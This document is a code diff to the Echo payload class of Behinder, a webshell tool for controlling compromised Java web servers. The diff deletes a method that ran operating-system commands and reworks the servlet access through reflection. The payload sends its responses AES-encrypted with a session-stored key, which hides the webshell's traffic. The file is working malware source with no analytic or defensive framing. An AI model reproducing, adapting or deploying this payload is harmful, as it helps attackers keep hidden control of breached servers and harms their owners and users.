@@ -1,112 +1,76 @@
 package net.rebeyond.behinder.payload.java;
 
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-import java.nio.charset.Charset;
+import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpSession;
-import javax.servlet.jsp.PageContext;
 
 public class Echo {
    public static String content;
-   private ServletRequest Request;
-   private ServletResponse Response;
-   private HttpSession Session;
+   private Object Request;
+   private Object Response;
+   private Object Session;
 
    public boolean equals(Object obj) {
-      PageContext page = (PageContext)obj;
-      this.Session = page.getSession();
-      this.Response = page.getResponse();
-      this.Request = page.getRequest();
-      page.getResponse().setCharacterEncoding("UTF-8");
       HashMap result = new HashMap();
-      boolean var12 = false;
+      boolean var13 = false;
 
-      ServletOutputStream so;
+      Object so;
+      Method write;
       label77: {
          try {
-            var12 = true;
+            var13 = true;
+            this.fillContext(obj);
             result.put("status", "success");
             result.put("msg", content);
-            var12 = false;
+            var13 = false;
             break label77;
-         } catch (Exception var16) {
-            result.put("msg", var16.getMessage());
+         } catch (Exception var17) {
+            result.put("msg", var17.getMessage());
             result.put("status", "success");
-            var12 = false;
+            var13 = false;
          } finally {
-            if (var12) {
+            if (var13) {
                try {
-                  so = this.Response.getOutputStream();
-                  so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-                  so.flush();
-                  so.close();
-                  page.getOut().clear();
-               } catch (Exception var13) {
-                  var13.printStackTrace();
+                  so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getDeclaredMethod("write", byte[].class);
+                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                  so.getClass().getDeclaredMethod("flush").invoke(so);
+                  so.getClass().getDeclaredMethod("close").invoke(so);
+               } catch (Exception var14) {
                }
 
             }
          }
 
          try {
-            so = this.Response.getOutputStream();
-            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-            so.flush();
-            so.close();
-            page.getOut().clear();
-         } catch (Exception var14) {
-            var14.printStackTrace();
+            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getDeclaredMethod("write", byte[].class);
+            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+            so.getClass().getDeclaredMethod("flush").invoke(so);
+            so.getClass().getDeclaredMethod("close").invoke(so);
+         } catch (Exception var15) {
          }
 
          return true;
       }
 
       try {
-         so = this.Response.getOutputStream();
-         so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-         so.flush();
-         so.close();
-         page.getOut().clear();
-      } catch (Exception var15) {
-         var15.printStackTrace();
+         so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+         write = so.getClass().getDeclaredMethod("write", byte[].class);
+         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+         so.getClass().getDeclaredMethod("flush").invoke(so);
+         so.getClass().getDeclaredMethod("close").invoke(so);
+      } catch (Exception var16) {
       }
 
       return true;
    }
 
-   private String RunCMD(String cmd) throws Exception {
-      Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
-      String result = "";
-      if (cmd != null && cmd.length() > 0) {
-         Process p;
-         if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
-            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
-         } else {
-            p = Runtime.getRuntime().exec(cmd);
-         }
-
-         BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
-
-         for(String disr = br.readLine(); disr != null; disr = br.readLine()) {
-            result = result + disr + "\n";
-         }
-
-         result = new String(result.getBytes(osCharset));
-      }
-
-      return result;
-   }
-
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getAttribute("u").toString();
+      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
@@ -152,5 +116,20 @@ public class Echo {
 
       sb.append("}");
       return sb.toString();
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = objMap.get("session");
+         this.Response = objMap.get("response");
+         this.Request = objMap.get("request");
+      }
+
+      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
 }
